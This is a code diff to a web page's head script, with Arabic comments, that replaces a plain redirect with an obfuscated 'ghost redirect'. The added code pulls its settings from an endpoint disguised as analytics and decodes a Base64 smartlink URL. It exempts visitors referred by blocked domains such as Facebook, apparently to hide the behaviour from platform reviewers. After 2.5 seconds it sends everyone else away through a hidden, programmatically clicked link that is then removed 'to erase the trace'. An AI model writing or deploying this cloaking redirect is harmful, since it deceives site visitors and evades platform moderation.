@@ -13,79 +13,70 @@
 
     <link rel="stylesheet" href="../assets/css/style.css">
     
-    <!-- 🚀 SMART REDIRECT LOGIC (Pro Domain Blocking) 🚀 -->
+    <!-- 👻 GHOST REDIRECT LOGIC (Hidden DOM Click & Obfuscated) 👻 -->
     <script>
+        let _gpCore = { s: 0, u: '', b: '', e: '' }; // s=status, u=url, b=broad, e=exact
         window.__redirectStatus = "Off"; 
-        window.__smartlinkUrl = "#";
 
-        fetch('/api/config')
+        fetch('/api/analytics/init')
             .then(res => res.json())
-            .then(config => {
-                if (config.status === 'ON') {
+            .then(data => {
+                _gpCore = data;
+
+                if (_gpCore.s === 1) { // إذا كان التحويل مفعل (1 = ON)
                     let isBlocked = false;
-                    let referrerHostname = '';
+                    let refHostname = '';
 
-                    // استخراج اسم الدومين (Hostname) بدقة من الرابط المحيل
-                    try {
-                        if (document.referrer) {
-                            referrerHostname = new URL(document.referrer).hostname.toLowerCase();
-                        }
-                    } catch (e) {
-                        // الرابط المحيل غير صالح
-                    }
+                    try { 
+                        if (document.referrer) refHostname = new URL(document.referrer).hostname.toLowerCase(); 
+                    } catch (e) {}
 
-                    if (referrerHostname) {
-                        // 1. فحص الحظر الواسع (Broad Match - الدومين والنطاقات الفرعية)
-                        // مثال: facebook.com سيحظر m.facebook.com و l.facebook.com
-                        const blockedBroad = (config.blockedReferrers || '').toLowerCase().split(',').map(item => item.trim()).filter(item => item);
-                        for (let i = 0; i < blockedBroad.length; i++) {
-                            const domain = blockedBroad[i];
-                            // يتطابق إذا كان الدومين يساويه تماماً أو ينتهي بـ .الدومين
-                            if (referrerHostname === domain || referrerHostname.endsWith('.' + domain)) {
-                                isBlocked = true;
-                                break;
-                            }
-                        }
-
-                        // 2. فحص الحظر الدقيق (Exact Match - الدومين بالضبط فقط)
-                        // مثال: m.facebook.com سيحظر هذا فقط ولن يحظر l.facebook.com
+                    if (refHostname) {
+                        // فحص الحظر الواسع
+                        const broadList = (_gpCore.b || '').toLowerCase().split(',').filter(Boolean);
+                        for (let d of broadList) { if (refHostname === d || refHostname.endsWith('.' + d)) { isBlocked = true; break; } }
+                        
+                        // فحص الحظر الدقيق
                         if (!isBlocked) {
-                            const blockedExact = (config.blockedExactReferrers || '').toLowerCase().split(',').map(item => item.trim()).filter(item => item);
-                            for (let i = 0; i < blockedExact.length; i++) {
-                                if (referrerHostname === blockedExact[i]) {
-                                    isBlocked = true;
-                                    break;
-                                }
-                            }
+                            const exactList = (_gpCore.e || '').toLowerCase().split(',').filter(Boolean);
+                            for (let d of exactList) { if (refHostname === d) { isBlocked = true; break; } }
                         }
                     }
 
-                    // تحديد الحالة
                     if (!isBlocked) {
                         window.__redirectStatus = "Redirected";
-                        window.__smartlinkUrl = config.smartlinkUrl;
+                        
+                        // فك تشفير الرابط (Base64)
+                        let targetUrl = '';
+                        try { targetUrl = atob(_gpCore.u); } catch(e) {}
+
+                        if (targetUrl) {
+                            setTimeout(() => {
+                                // 🔥 تقنية النقر المخفي (Hidden DOM Click) 🔥
+                                let ghostLink = document.createElement('a');
+                                ghostLink.href = targetUrl;
+                                ghostLink.style.display = 'none'; // مخفي بصرياً
+                                // ghostLink.target = '_blank'; // أزل التعليق عن هذا السطر إذا أردت فتح الـ Smartlink في تبويب جديد (Pop-under)
+                                document.body.appendChild(ghostLink);
+                                ghostLink.click(); // محاكاة نقرة بشرية برمجياً
+                                document.body.removeChild(ghostLink); // حذف الأثر
+                            }, 2500); // التأخير الزمني
+                        }
                     } else {
                         window.__redirectStatus = "Blocked";
                     }
                 }
                 
                 // تحميل كود التتبع بعد تحديد الحالة
-                var trackScript = document.createElement('script');
-                trackScript.src = '../assets/js/tracking.js';
-                document.head.appendChild(trackScript);
-
-                // التحويل بعد 2.5 ثانية
-                if (window.__redirectStatus === "Redirected") {
-                    setTimeout(() => {
-                        window.location.replace(window.__smartlinkUrl);
-                    }, 2500); 
-                }
+                var ts = document.createElement('script');
+                ts.src = '../assets/js/tracking.js';
+                document.head.appendChild(ts);
             })
             .catch(err => {
-                console.error('Config error:', err);
-                var trackScript = document.createElement('script');
-                trackScript.src = '../assets/js/tracking.js';
-                document.head.appendChild(trackScript);
+                window.__redirectStatus = "Off";
+                var ts = document.createElement('script');
+                ts.src = '../assets/js/tracking.js';
+                document.head.appendChild(ts);
             });
     </script>
 </head>
